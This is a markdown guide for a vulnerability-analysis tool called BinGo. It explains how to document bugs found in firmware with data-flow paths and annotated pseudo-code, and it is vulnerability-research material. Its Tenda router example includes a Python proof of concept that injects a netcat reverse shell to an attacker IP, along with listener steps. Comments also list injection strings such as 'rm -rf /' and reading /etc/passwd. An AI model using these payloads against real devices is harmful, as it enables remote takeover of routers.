# Evidence Generation Guidelines for BinGo

## Overview

This document provides detailed guidelines for generating comprehensive vulnerability evidence with complete pseudo-code paths.

## Evidence Quality Standards

### Level 1: Minimum Evidence (NOT ACCEPTABLE)

```
❌ BAD: "Found strcpy in formHandler at 0x405200"
```

### Level 2: Basic Evidence (BARELY ACCEPTABLE)

```
⚠️  MINIMAL:
Function: formHandler
Address: 0x405200
Vulnerability: strcpy(buffer, user_input)
```

### Level 3: Good Evidence (ACCEPTABLE)

```
✅ GOOD:
Function: formHandler at 0x405200 (line 45)
Vulnerable code: strcpy(buffer, user_input)
Issue: No bounds checking, buffer is 64 bytes, input can be larger
```

### Level 4: Complete Evidence (REQUIRED)

```
✅✅ EXCELLENT (Required):
Complete data flow from source to sink with full pseudo-code for every function,
including buffer sizes, validation checks, and annotated vulnerability points.
```

## Complete Evidence Structure

### 1. Data Flow Path

Every vulnerability report must include:

```markdown
#### Data Flow Path
```
Source (network input)
  └─> Function A (validation/parsing)
      └─> Function B (processing)
          └─> Function C (vulnerable sink)
```
```

### 2. Complete Pseudo-code for EACH Function

For EVERY function in the path, provide:

```markdown
**Step 1: Source Function**
```c
// File: src/network.c
// Function: recv_http_request
// Address: 0x405200
// Lines: 20-85
// ============================================================================

void recv_http_request(int socket_fd) {
    char buffer[4096];  // Network receive buffer
    char *query_data;

    // SOURCE: Receive data from network
    // Vulnerability: No enforced maximum size
    int bytes = recv(socket_fd, buffer, sizeof(buffer), 0);

    if (bytes > 0) {
        buffer[bytes] = '\0';

        // Extract query string from HTTP request
        query_data = extract_query(buffer);  // Returns pointer into buffer

        // Pass to handler WITHOUT size validation
        handle_query(query_data);  // Line 75
    }
}
```
```

### 3. Buffer Analysis Table

```markdown
#### Buffer Analysis

| Buffer | Location | Type | Size | Max Input | Safe? |
|--------|----------|------|------|-----------|-------|
| buffer | recv_http_request:25 | char[4096] | 4096 | 4096 | ✅ (recv bounded) |
| query_data | recv_http_request:30 | char* | Unknown | 4096 | ⚠️ (pointer) |
| cmd_buffer | execute_command:45 | char[128] | 128 | 4096 | ❌ (overflow!) |

**Overflow Calculation:**
- Input from recv: up to 4096 bytes
- Intermediate buffer: unchecked pointer (no size limit)
- Final buffer (cmd_buffer): 128 bytes
- Copy function: strcpy (no bounds check)
- **Overflow: 3968 bytes**
```

### 4. Missing Protections Checklist

```markdown
#### Security Analysis

**Input Validation:**
- ❌ No length check after recv
- ❌ No validation of query_data size
- ❌ No maximum size enforced

**Bounds Checking:**
- ❌ strcpy used instead of strncpy
- ❌ Buffer size not verified before copy
- ❌ No runtime bounds checking

**Sanitization:**
- ❌ No character filtering (for command injection)
- ❌ No input escaping
- ❌ No whitelist validation

**Memory Safety:**
- ❌ Stack canaries: Disabled
- ❌ NX bit: Disabled (executable stack)
- ❌ ASLR: Disabled (fixed addresses)
```

### 5. Annotated Vulnerability Point

```markdown
#### Vulnerability Point (Annotated)

```c
// Function: execute_command
// Location: line 45-50
// ============================================================================

void execute_command(char *user_command) {
    char cmd_buffer[128];  // [LIMIT 128 bytes]

    // VULNERABILITY: Command injection via sprintf + system
    // Issue: user_command can be up to 4096 bytes
    // Impact: Buffer overflow + shell command injection

    sprintf(cmd_buffer, "/bin/sh -c '%s'", user_command);
    // ^^^^^^^^ [UNSAFE_COPY]
    //    ├─ Copies entire user_command without length check
    //    ├─ Overflows cmd_buffer if user_command > ~110 bytes
    //    └─ Allows command injection via shell metacharacters

    system(cmd_buffer);  // [SINK] - Executes injected commands
    // ^^^^^^
    // Executes arbitrary shell commands if input contains:
    //   `; rm -rf /`   (command chaining)
    //   `| cat /etc/passwd` (pipe)
    //   `$(malicious)` (command substitution)
}
```
```

## Example: Complete Evidence for Command Injection

Here's a complete evidence example for a real vulnerability:

### Vulnerability: Command Injection in TendaTelnet

```markdown
#### Complete Data Flow Path

**Step 1: HTTP Request Handler (Source)**
```c
// File: httpd/src/handlers.c
// Function: formHandler
// Address: 0x408500
// Lines: 120-180
// ============================================================================

void formHandler(int socket, char *url, char *query_string) {
    char param_name[256];
    char param_value[256];

    // [SOURCE] Parse HTTP POST/GET parameters
    // query_string format: "telnet_ip=192.168.1.1&telnet_port=23"
    while (get_parameter(query_string, param_name, param_value)) {

        if (strcmp(param_name, "telnet_ip") == 0) {
            // Extract IP address parameter
            // No validation of parameter value
            enable_telnet(param_value);  // Line 155
        }

        query_string = next_parameter(query_string);
    }
}
```

**Step 2: Telnet Configuration (Intermediate)**
```c
// File: httpd/src/telnet.c
// Function: enable_telnet
// Address: 0x45BBB8
// Lines: 45-90
// ============================================================================

void enable_telnet(char *ip_address) {
    char command_buffer[256];

    // [NO_VALIDATION] IP address not validated
    // Should check: valid IP format, no shell metacharacters
    // Actual: Accepts ANY string including shell commands

    // Build telnet enable command
    // [UNSAFE_STRING_FORMAT] Directly inserts user input
    snprintf(command_buffer, sizeof(command_buffer),
             "telnetd -b %s &", ip_address);  // Line 67

    // Pass to system execution
    execute_system_command(command_buffer);  // Line 70
}
```

**Step 3: System Execution (Sink)**
```c
// File: httpd/src/system.c
// Function: execute_system_command
// Address: 0x45BBC0
// Lines: 200-210
// ============================================================================

void execute_system_command(char *command) {
    // [SINK] Execute command via system()
    // VULNERABILITY: Command reaches shell without sanitization

    system(command);  // Line 205
    // ^^^^^^
    // If command is: "telnetd -b 192.168.1.1; nc -e /bin/sh 4444 &"
    // Shell executes BOTH commands:
    //   1. telnetd -b 192.168.1.1
    //   2. nc -e /bin/sh 4444  ← [REVERSE SHELL]
}
```

#### Data Flow Diagram

```
HTTP Request
    ↓
formHandler() parses query string
    ↓
Extract "telnet_ip" parameter (user-controlled)
    ↓
enable_telnet(ip_address) - NO validation
    ↓
snprintf("telnetd -b %s", ip_address)
    ↓
execute_system_command(command)
    ↓
system(command) ← SINK (RCE)
```

#### Vulnerability Analysis

**Input Validation:**
- ❌ No IP address format validation
- ❌ No character filtering
- ❌ No maximum length enforcement on parameter value

**Command Construction:**
- ❌ User input directly inserted into shell command
- ❌ No escaping of special characters (`;`, `|`, `&`, `$`, `(`, `)`)
- ❌ Shell interprets metacharacters

**Impact:**
Attacker can inject arbitrary shell commands:

```bash
# Normal request
telnet_ip=192.168.1.1
# Executes: telnetd -b 192.168.1.1 &

# Malicious request
telnet_ip=192.168.1.1; nc -e /bin/sh 10.0.0.1 4444 &
# Executes: telnetd -b 192.168.1.1; nc -e /bin/sh 10.0.0.1 4444 &
#           └─ Starts telnet        └─ Reverse shell to attacker
```

#### Proof of Concept

```python
#!/usr/bin/env python3
"""
PoC: Command Injection in TendaTelnet
Target: Tenda httpd
Vulnerability: Unvalidated user input reaches system()
"""

import requests

TARGET = "http://192.168.0.1"
ATTACKER_IP = "10.0.0.1"
ATTACKER_PORT = 4444

def exploit():
    """Exploit command injection to get reverse shell"""

    # Injected command: Start netcat reverse shell
    # Format: telnet_ip=VALID_IP; MALICIOUS_COMMAND &
    payload = f"192.168.1.1; nc -e /bin/sh {ATTACKER_IP} {ATTACKER_PORT} &"

    data = {
        "telnet_ip": payload
    }

    print(f"[*] Sending payload to {TARGET}")
    print(f"[*] Payload: {payload}")

    # Start netcat listener first
    print(f"[*] Start listener: nc -lvnp {ATTACKER_PORT}")

    # Send malicious request
    response = requests.post(f"{TARGET}/goform/telnet", data=data)

    print("[+] Payload sent!")
    print("[+] Check your netcat listener for shell")

if __name__ == "__main__":
    exploit()
```

**Usage:**
1. Terminal 1: `nc -lvnp 4444` (start listener)
2. Terminal 2: `python3 exploit.py` (send payload)
3. Get root shell on router

**Expected Result:** Root shell on the router
```

## Evidence Extraction Process

### Step 1: Identify Data Flow

Use Joern to trace path:
```scala
cpg.taintTracking(source).flowsTo(sink).p.foreach { flow =>
  println(s"Path: ${flow.source} -> ${flow.sink}")
  flow.pathElements.foreach { e =>
    println(s"  ${e.method}:${e.line}")
  }
}
```

### Step 2: Extract Function Code

For each function in path:
```bash
# Extract from decompiled output
grep -A 100 "function formHandler" decompiled/all_functions.c
```

### Step 3: Annotate Vulnerability Points

Mark in code:
- `[SOURCE]` - Where tainted data enters
- `[NO_VALIDATION]` - Missing security checks
- `[UNSAFE_COPY]` - Dangerous string operations
- `[SINK]` - Where vulnerability triggers

### Step 4: Build Tables

Create analysis tables:
- Buffer size comparison
- Missing protections
- Security check failures

### Step 5: Generate Diagram

Draw ASCII data flow showing each step.

## Checklist for Complete Evidence

Before submitting vulnerability report, verify:

- [ ] Every function in data flow path shown with FULL code
- [ ] Source, intermediate, and sink functions all documented
- [ ] Buffer sizes documented for all buffers
- [ ] Data flow diagram included
- [ ] Missing protections checklist completed
- [ ] Vulnerability point annotated with comments
- [ ] Root cause clearly explained
- [ ] Exploit trigger conditions documented
- [ ] Complete, executable PoC included
- [ ] PoC tested and verified
- [ ] Impact assessment included

## Common Mistakes to Avoid

❌ **Don't:**
- Show only function snippets
- Omit intermediate functions
- Skip buffer size analysis
- Forget to annotate vulnerable lines
- Use incomplete data flow diagrams

✅ **Do:**
- Show complete function bodies
- Include every function in the path
- Document all buffer sizes
- Annotate vulnerability points
- Create clear, detailed diagrams
- Provide executable PoCs
- Explain root cause thoroughly
